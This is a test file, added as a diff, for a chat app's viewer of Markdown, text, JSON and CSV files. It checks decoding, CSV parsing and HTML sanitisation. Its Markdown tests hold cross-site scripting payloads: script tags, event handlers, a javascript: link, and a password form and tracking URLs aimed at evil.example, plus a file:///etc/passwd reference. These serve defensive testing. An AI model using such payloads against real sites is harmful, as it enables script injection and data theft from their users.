@@ -1,0 +1,187 @@
+import { describe, expect, it } from "vitest";
+import { MAX_TABLE_COLUMNS, MAX_TABLE_ROWS, decodeText, indentJson, parseCsv, renderMarkdown } from "../textFiles";
+import { badgeOfKind, bytesMatchKind, chatFileOpensInViewer, fileKindOf } from "../fileKinds";
+
+const encode = (text: string) => new TextEncoder().encode(text);
+
+function render(markdown: string): HTMLElement {
+    const host = document.createElement("div");
+    host.innerHTML = renderMarkdown(markdown);
+    return host;
+}
+
+describe("picking the reader for a text file", () => {
+    it("knows the four text types", () => {
+        expect(fileKindOf("notes.md")).toBe("markdown");
+        expect(fileKindOf("log.TXT")).toBe("text");
+        expect(fileKindOf("data.json")).toBe("json");
+        expect(fileKindOf("sheet.csv")).toBe("csv");
+    });
+
+    it("opens them from a chat card", () => {
+        for (const name of ["a.md", "a.txt", "a.json", "a.csv"]) {
+            expect(chatFileOpensInViewer(name)).toBe(true);
+        }
+    });
+
+    it("leaves every other file as a download", () => {
+        for (const name of ["a.zip", "a.docx", "a.xlsx", "a.pptx", "a.doc", "a.html", "a.js", "a.xml"]) {
+            expect(chatFileOpensInViewer(name)).toBe(false);
+        }
+    });
+
+    it("gives each type its badge", () => {
+        expect(badgeOfKind("markdown")).toMatchObject({ label: "MD", kindName: "Markdown" });
+        expect(badgeOfKind("csv").label).toBe("CSV");
+    });
+
+    it("takes text, with or without a byte order mark, and refuses binary files named as text", () => {
+        expect(bytesMatchKind("text", "a.txt", encode("hello"))).toBe(true);
+        expect(bytesMatchKind("text", "a.txt", new Uint8Array([0xef, 0xbb, 0xbf, 0x68, 0x69]))).toBe(true);
+        expect(bytesMatchKind("csv", "a.csv", new Uint8Array([0xff, 0xfe, 0x61, 0x00]))).toBe(true);
+        expect(bytesMatchKind("text", "a.txt", new Uint8Array([0x50, 0x4b, 0x03, 0x04, 0x00, 0x00]))).toBe(false);
+        expect(bytesMatchKind("markdown", "a.md", new Uint8Array(0))).toBe(false);
+    });
+});
+
+describe("decoding", () => {
+    it("reads UTF-8, UTF-8 with a mark and UTF-16", () => {
+        expect(decodeText(encode("héllo ✓")).text).toBe("héllo ✓");
+        expect(decodeText(new Uint8Array([0xef, 0xbb, 0xbf, 0x68, 0x69])).text).toBe("hi");
+        expect(decodeText(new Uint8Array([0xff, 0xfe, 0x68, 0x00, 0x69, 0x00])).text).toBe("hi");
+        expect(decodeText(new Uint8Array([0xfe, 0xff, 0x00, 0x68, 0x00, 0x69])).text).toBe("hi");
+    });
+
+    it("shows the first part only and says there is more, without a broken letter at the end", () => {
+        // "é" is two bytes: a limit of 3 cuts the second one in half.
+        const result = decodeText(encode("aéé"), 4);
+        expect(result.truncated).toBe(true);
+        expect(result.text).toBe("aé");
+        expect(decodeText(encode("abc"), 3).truncated).toBe(false);
+    });
+});
+
+describe("JSON layout", () => {
+    it("lays a one-line text over lines, keeping every value exactly", () => {
+        expect(indentJson('{"a":1,"b":[true,null,"x,y"],"c":{},"n":12345678901234567890}')).toBe(
+            [
+                "{",
+                '  "a": 1,',
+                '  "b": [',
+                "    true,",
+                "    null,",
+                '    "x,y"',
+                "  ],",
+                '  "c": {},',
+                '  "n": 12345678901234567890',
+                "}",
+            ].join("\n")
+        );
+    });
+
+    it("keeps quotes and braces inside strings", () => {
+        expect(indentJson('{"s":"a \\" } {"}')).toBe('{\n  "s": "a \\" } {"\n}');
+    });
+
+    it("leaves a text that already has lines, or that is not JSON, readable", () => {
+        const pretty = '{\n  "a": 1\n}\n';
+        expect(indentJson(pretty)).toBe(pretty);
+        expect(indentJson("not json at all")).toBe("not json at all");
+    });
+});
+
+describe("tables from CSV", () => {
+    it("reads quotes, doubled quotes, commas and line breaks inside cells", () => {
+        const table = parseCsv('Name,Note\r\n"Lee, Sam","said ""hi""\nthen left"\nOmar,\n', true);
+        expect(table.rows).toEqual([
+            ["Name", "Note"],
+            ["Lee, Sam", 'said "hi"\nthen left'],
+            ["Omar", ""],
+        ]);
+        expect(table.totalRows).toBe(3);
+    });
+
+    it("uses a semicolon or a tab when that is what the first line uses", () => {
+        expect(parseCsv("a;b;c\n1;2;3", true).rows[1]).toEqual(["1", "2", "3"]);
+        expect(parseCsv("a\tb\n1\t2", true).rows[1]).toEqual(["1", "2"]);
+    });
+
+    it("skips blank lines and keeps the last row without a final line break", () => {
+        expect(parseCsv("a,b\n\n1,2", true).rows).toEqual([
+            ["a", "b"],
+            ["1", "2"],
+        ]);
+    });
+
+    it("shows the first rows and columns only, and counts the rows", () => {
+        const manyRows = Array.from({ length: MAX_TABLE_ROWS + 5 }, (_, index) => `r${index},x`).join("\n");
+        const rows = parseCsv(manyRows, true);
+        expect(rows.rows).toHaveLength(MAX_TABLE_ROWS);
+        expect(rows.rowsCut).toBe(true);
+        expect(rows.totalRows).toBe(MAX_TABLE_ROWS + 5);
+        expect(parseCsv(manyRows, false).totalRows).toBeUndefined();
+
+        const manyColumns = Array.from({ length: MAX_TABLE_COLUMNS + 3 }, (_, index) => `c${index}`).join(",");
+        const columns = parseCsv(manyColumns, true);
+        expect(columns.rows[0]).toHaveLength(MAX_TABLE_COLUMNS);
+        expect(columns.columnsCut).toBe(true);
+    });
+
+    it("keeps a cell that looks like a web page as text", () => {
+        expect(parseCsv('a\n"<script>alert(1)</script>"', true).rows[1][0]).toBe("<script>alert(1)</script>");
+    });
+});
+
+describe("Markdown", () => {
+    it("formats headings, lists, tables and code like chat messages", () => {
+        const host = render("# Title\n\n- one\n- two\n\n| A | B |\n|---|---|\n| 1 | 2 |\n\n```\ncode\n```\n");
+        expect(host.querySelector("h1")?.textContent).toBe("Title");
+        expect(host.querySelectorAll("li")).toHaveLength(2);
+        expect(host.querySelector("table th")?.textContent).toBe("A");
+        expect(host.querySelector("pre code")?.textContent).toContain("code");
+    });
+
+    it("runs nothing from HTML inside the file", () => {
+        const host = render(
+            [
+                "<script>window.__ran = true</script>",
+                '<img src="x" onerror="window.__ran = true">',
+                '<a href="javascript:window.__ran = true">click</a>',
+                '<iframe src="https://evil.example"></iframe>',
+                '<form action="https://evil.example"><input name="pw"><button>Send</button></form>',
+                '<div style="background:url(https://evil.example/track)" onclick="window.__ran = true">box</div>',
+                "<style>body{background:url(https://evil.example/track)}</style>",
+                '<video src="https://evil.example/v.mp4"></video>',
+            ].join("\n\n")
+        );
+        expect(host.querySelector("script, iframe, form, input, button, style, video, object, embed")).toBeNull();
+        expect(host.innerHTML).not.toMatch(/onerror|onclick|javascript:|style=/i);
+        expect(host.textContent).toContain("click");
+        expect((window as unknown as { __ran?: boolean }).__ran).toBeUndefined();
+    });
+
+    it("turns pictures from other sites into links, so opening the file does not tell those sites", () => {
+        const host = render(
+            '![Team photo](https://tracker.example/pixel.png)\n\n<img src="http://tracker.example/a.png" alt="">'
+        );
+        expect(host.querySelector("img")).toBeNull();
+        const links = host.querySelectorAll("a");
+        expect(links).toHaveLength(2);
+        expect(links[0].getAttribute("href")).toBe("https://tracker.example/pixel.png");
+        expect(links[0].textContent).toBe("Team photo");
+    });
+
+    it("keeps a picture that is inside the file, and drops other addresses to their description", () => {
+        const inline = render("![dot](data:image/png;base64,iVBORw0KGgo=)");
+        expect(inline.querySelector("img")?.getAttribute("src")).toMatch(/^data:image\/png/);
+        const other = render("![secret](file:///etc/passwd)\n\n![svg](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)");
+        expect(other.querySelector("img")).toBeNull();
+        expect(other.textContent).toContain("secret");
+    });
+
+    it("opens links in a new tab without handing over the page", () => {
+        const link = render("[docs](https://example.com/a)").querySelector("a");
+        expect(link?.getAttribute("target")).toBe("_blank");
+        expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
+    });
+});
